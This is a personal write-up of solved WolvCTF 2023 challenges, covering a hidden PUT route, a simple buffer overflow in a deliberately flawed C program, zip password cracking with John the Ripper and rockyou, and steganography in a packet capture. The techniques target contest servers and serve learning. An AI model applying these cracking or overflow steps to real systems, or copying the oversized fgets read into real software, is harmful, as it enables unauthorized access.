---
description: WolvCTF 2023 was held from 18 Mar - 20 Mar 2023.
---

# WolvCTF 2023

There are two divisions, Open and University of Michigan students. No team limit sizes.

The challenges range from beginner to medium in difficulty. The challenge categories included RE, binary exploit, web exploit, cryptography, forensics, osint and misc.

More details can be found [here](https://ctftime.org/event/1866).

I participated as solo with my last name initials `RZ` and team name `RZ` as well.&#x20;

I solved challenges in the Beginner, Misc and Forensics category.

<figure><img src="../.gitbook/assets/image (2) (7) (1).png" alt=""><figcaption></figcaption></figure>

Fun Fact: I actually did not plan to participate in this CTF. However, after I solved [b01lers CTF's switcheroo](https://gadiel-lau.gitbook.io/2023-writeups/2023-ctfs/b01lers-ctf-2023#switcheroo) challenge, I had already created an account and team on the WolvCTF platform. Hence, I decided to spend some time attempting the challenges.

## Sanity Check

<figure><img src="../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

For this challenge, it provided a link to the Discord server. Once we navigate to the `rules` channel, we will be able to see the flag beside the channel name.

<figure><img src="../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

Flag: wctf{w3lc0m3\_t0\_w0lvctf\_2023}

## Switcheroo

<figure><img src="../.gitbook/assets/image (16) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

As previously mentioned, I solved the[ b01lersCTF's switcheroo](https://gadiel-lau.gitbook.io/2023-writeups/2023-ctfs/b01lers-ctf-2023#switcheroo) challenge and obtained the flag from there. It was pretty interesting that these two different CTFs swapped their flags.&#x20;

Flag: wctf{M41z3\_4nd\_Blu3}

## Charlotte's Web

<figure><img src="../.gitbook/assets/image (6) (2) (2).png" alt=""><figcaption></figcaption></figure>

We are given a link to this challenge. First, lets check out the source code of this site.

```html
<!DOCTYPE html>
<html>
<head>
<title>index</title>
<script>
function start() {
alert("where's the flag? i swear it was around here somewhere");
}
</script>
</head>
<body>
<button onclick='start()'>click me for the flag</button>
<!-- /src -->
</body>
</html>
```

As we can see, the `src` was commented out from the code.

We can then navigate to [https://charlotte-tlejfksioa-ul.a.run.app/src](https://charlotte-tlejfksioa-ul.a.run.app/src) and check out the source code.

```python
import flask

app = flask.Flask(__name__)

@app.route('/', methods=['GET'])
def index():
  return flask.send_file('index.html')

@app.route('/src', methods=['GET'])
def source():
  return flask.send_file('app.py')

@app.route('/super-secret-route-nobody-will-guess', methods=['PUT'])
def flag():
  return open('flag').read()
```

We can see that the flag is stored in `/super-secret-route-nobody-will-guess`, and it is using the `PUT` method.

We can simply change `GET` method to `PUT` in repeater in `Burp Suite`.

```html
PUT /super-secret-route-nobody-will-guess HTTP/2
Host: charlotte-tlejfksioa-ul.a.run.app
Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

This will give us the flag after we send this request.

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Alternatively, we could use the following `curl` command to get the flag

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X put https://charlotte-tlejfksioa-ul.a.run.app/super-secret-route-nobody-will-guess
wctf{y0u_h4v3_b33n_my_fr13nd___th4t_1n_1t53lf_1s_4_tr3m3nd0u5_th1ng}   
```

Flag: wctf{y0u\_h4v3\_b33n\_my\_fr13nd\_\_\_th4t\_1n\_1t53lf\_1s\_4\_tr3m3nd0u5\_th1ng}

## baby-re

<figure><img src="../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a `baby-re` file.

Let's check the file format by running the `file` command.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file baby-re       
baby-re: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=28616782c7c187d84f11642c2dc9b92e814d8025, for GNU/Linux 3.2.0, stripped
```

Now, lets try to get the flag by running `strings` on it and using `grep` to search for the flag format.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ strings baby-re | grep wctf
wctf{Oh10_Stat3_1s_Smelly!}
wctf{Must_be_fr0m_OSU}
wctf{A_t0tally_fake_flag}
```

There are three flags displayed, but only the first one is the correct flag.

Flag: wctf{Oh10\_Stat3\_1s\_Smelly!}

## baby-pwn

<figure><img src="../.gitbook/assets/image (8) (3) (1).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given 2 files. The first file `baby-pwn` is the file which runs the program. The second file `baby-pwn.c` is the source code written in `C` language.

We could first check out the contents of the source code

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat baby-pwn.c 
#include <stdio.h>
#include <string.h>

void print_flag(void)
{
    printf("wctf{This_is_just_a_placeholder}\n");
}

void vuln(void)
{
    volatile int a = 0xdeadbeef;
    char buff[32] = { 0 };
    printf("Gimme some input: ");
    fgets(buff, 48, stdin);

    if (a != 0xdeadbeef) {
        print_flag();
    }
}


int main(void)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    vuln();
    return 0;
}
```

The program defines two functions - `vuln()` and `print_flag()`. `vuln()` function takes some input from the user using `fgets()` function and stores it in a buffer called `buff`. This buffer has a size of 32 bytes but `fgets()` can read up to 48 bytes due to a bug in the function call. This creates a buffer overflow vulnerability in the program.

The `print_flag()` function simply prints a flag that's stored in the function itself.

The `main()` function first disables the buffering of input and output, and then calls `vuln()` function. If the program is exploited successfully by overflowing the `buff` buffer in `vuln()` function, the `print_flag()` function will be executed, which will print out the flag.

The flag printed by `print_flag()` is just a placeholder and not an actual valid flag.

To get the flag, we can cause buffer overflow as such

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$  nc baby-pwn.wolvctf.io 1337                             
== proof-of-work: disabled ==
Gimme some input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
wctf{W3lc0me_t0_C0stc0_I_L0v3_Y0u!}
```

Flag: wctf{W3lc0me\_t0\_C0stc0\_I\_L0v3\_Y0u!}

## We Will Rock You

<figure><img src="../.gitbook/assets/image (5) (1) (3).png" alt=""><figcaption></figcaption></figure>

First, we could download the file provided and check the file type by running the `file` command.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file we_will_rock_you.zip 
we_will_rock_you.zip: Zip archive data, at least v1.0 to extract, compression method=store
```

We have verified that it is a `zip` file and we can try to unzip it. However, it would prompt us  for a password.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip we_will_rock_you.zip 
Archive:  we_will_rock_you.zip
   creating: we_will_rock_you/
[we_will_rock_you.zip] we_will_rock_you/flag.txt password: 
   skipping: we_will_rock_you/flag.txt  incorrect password
```

From the challenge title, we could probably infer that it was referring to `rockyou.txt`, a commonly used dictionary word list used to crack passwords.

We can crack the password as such

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john we_will_rock_you.zip > hash         
ver 1.0 we_will_rock_you.zip/we_will_rock_you/ is not encrypted, or stored with non-handled compression type
ver 1.0 efh 5455 efh 7875 we_will_rock_you.zip/we_will_rock_you/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=7D20D45F ts=B816 cs=b816 type=0
                                                                                                                   
┌──(kali㉿kali)-[~/Downloads]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
michigan4ever    (we_will_rock_you.zip/we_will_rock_you/flag.txt)     
1g 0:00:00:00 DONE (2023-03-18 03:10) 2.000g/s 11132Kp/s 11132Kc/s 11132KC/s mickovgys..michellsmg
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password cracked is: `michigan4ever`.

Now, we are able to unzip the zipped file, navigate to the directory and read the flag.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cd we_will_rock_you            
                                                                                                                   
┌──(kali㉿kali)-[~/Downloads/we_will_rock_you]
└─$ cat flag.txt        
wctf{m1cH1g4n_4_3v3R}   
Flag: wctf{m1cH1g4n_4_3v3R}
```

Flag: wctf{m1cH1g4n\_4\_3v3R}

## yowhatsthepassword

<figure><img src="../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a `Python` file.

Opening the file shows the following code

```python
# I'm thinking of a number from 0 to 2^32 - 1
# Can you guess it?

import random

def generate(seed):
  random.seed(seed)
  c = 0
  while c != ord('}'):
    c = random.randint(97, 126)
    print(chr(c), end='')
  print()

secret = 'ly9ppw=='

import base64

s = int(input("password? >>> "))

if int(base64.b64decode(secret).hex(), 16) == s:
  generate(s)
else:
  print('nope')
```

To make the program generate the correct value of `s`, we need to decode the value of `secret` and convert it to an integer, and then use that integer as the value of `s` in the `if` statement. Here's how we can modify the code to generate the correct value of `s`:

```python
import random
import base64

def generate(seed):
  random.seed(seed)
  c = 0
  while c != ord('}'):
    c = random.randint(97, 126)
    print(chr(c), end='')
  print()

secret = 'ly9ppw=='

decoded_secret = int(base64.b64decode(secret).hex(), 16)
s = decoded_secret

if int(base64.b64decode(secret).hex(), 16) == s:
  generate(s)
else:
  print('nope')
```

In this modified version of the code, `decoded_secret` is the decoded value of `secret`, converted to an integer. This value is then assigned to `s`. Since `decoded_secret` is the correct value of `s` to make the `if` statement true, the program will call the `generate` function when we run it.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python decode.py 
wctf{ywtp}
```

Flag: wctf{ywtp}

## Dino Trading

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

For this challenge, it was under the forensics category and we were given a `.pcapng` file.

We could first open this file in `Wireshark` to analyze the packets further.

Once we have opened the file, we can go to `Statistics > Protocol Hierarchy` to check the protocols used in the network capture. We can  see that there's some `FTP Data` packets which looked pretty interesting.

<figure><img src="../.gitbook/assets/image (14) (4).png" alt=""><figcaption></figcaption></figure>

If we filter by `ftp-data`, we will notice a `epicfight.jpg` file being sent.

<figure><img src="../.gitbook/assets/image (18) (1) (3).png" alt=""><figcaption></figcaption></figure>

We can right click on the packet, `Follow > TCP Stream` and increment the stream until we  see the file transfer content.

<figure><img src="../.gitbook/assets/image (2) (8) (1).png" alt=""><figcaption></figcaption></figure>

&#x20;Before saving this image, we need to change `Show data as: ASCII` to `RAW`

<figure><img src="../.gitbook/assets/image (4) (2) (1).png" alt=""><figcaption></figcaption></figure>

We can then save this file as `flag.jpg` and view it.

<figure><img src="../.gitbook/assets/image (11) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

We can see an image of a `Stegosaurus` and `Shark` which likely indicates that this is a `steganography` challenge and the shark is likely indicating `Wireshark` which we had previously used to extract this image.

Alternatively, we could also go to `File > Export Objects > FTP - DATA` to extract the file.

Note that this would only work in the newer versions of Wireshark. Previously,  I was using Wireshark ver 3.6 and it did not provide the option to export objects from FTP-DATA.

<figure><img src="../.gitbook/assets/image (15) (1) (2).png" alt=""><figcaption></figcaption></figure>

We can save the image and view it as well.

<figure><img src="../.gitbook/assets/image (10) (6).png" alt=""><figcaption></figcaption></figure>

To extract the hidden information in this image, we can use `StegHide` to help us. By running the following command, we extracted a `hidden.txt` file.&#x20;

Note that there is no passphrase needed.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ steghide extract -sf flag.jpg 
Enter passphrase: 
wrote extracted data to "hidden.txt".
```

Next, we can read the contents of the `hidden.txt` file. We would realize that it is most likely encoded.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat hidden.txt 
d2N0Znthbl8xbWFnZV9pbl9hX3BlZWNhcF9iNjR9
```

We can try a commonly used encoding method - `Base64`, to decode it and it would give us the flag.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat hidden.txt | base64 -d
wctf{an_1mage_in_a_peecap_b64}            
```

Flag: wctf{an\_1mage\_in\_a\_peecap\_b64}
